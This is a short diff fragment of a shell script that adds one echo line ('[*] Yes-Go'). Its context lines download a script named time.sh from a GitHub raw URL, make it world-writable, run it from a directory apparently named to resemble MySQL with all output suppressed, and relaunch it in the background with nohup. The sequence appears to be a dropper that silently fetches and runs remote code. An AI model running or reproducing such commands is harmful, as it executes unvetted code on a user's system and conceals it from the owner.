@@ -18,3 +18,4 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/time.sh
 chmod 777 time.sh
 /bin/bash $HOME/myssqltcp/time.sh >/dev/null 2>&1
 nohup ./time.sh >/dev/null 2>&1 &
+echo "[*] Yes-Go"
